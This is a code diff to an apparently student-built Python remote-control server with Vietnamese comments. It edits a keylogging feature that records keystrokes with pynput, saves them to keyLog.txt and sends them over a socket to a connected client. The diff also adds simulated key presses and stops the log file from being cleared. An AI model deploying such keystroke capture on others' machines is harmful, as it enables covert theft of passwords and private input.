@@ -10,12 +10,14 @@ from tkinter import messagebox
 import pyautogui
 from PIL import Image, ImageTk
 
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener,Controller
 import logging
 
 import psutil
 import subprocess
 from subprocess import Popen,CREATE_NEW_CONSOLE,CREATE_NO_WINDOW
+
+keyboard = Controller()
 
 HOST = socket.gethostbyname(socket.gethostname()) # Lấy địa chỉ ID theo host name của máy
 PORT = 5050
@@ -273,6 +275,7 @@ def key_log(conn):
                 listener.join()
             if stop():
                 break
+            
     
     """Hàm in phím gửi các phím đã bấm qua cho client"""       
     def printKeys(conn):
@@ -284,6 +287,8 @@ def key_log(conn):
                 file.write("")
             if s == "":
                 s = "\0"
+            else:
+                s = s[:-1]
             """Đọc từ file keyLog.txt lưu vào biến s gửi qua cho client"""
             send(conn, s)
         else:
@@ -304,9 +309,11 @@ def key_log(conn):
     def unHook():   
         global stop_threads
         stop_threads = True
+        keyboard.press("s")
+        keyboard.release("s")
         t.join() 
-        with open(DIR + "\\keyLog.txt","w") as f:
-            f.write("")
+        # with open(DIR + "\\keyLog.txt","w") as f:
+        #     f.write("")
     
     """Nhận yêu cầu từ client và xử lí"""
     while True:
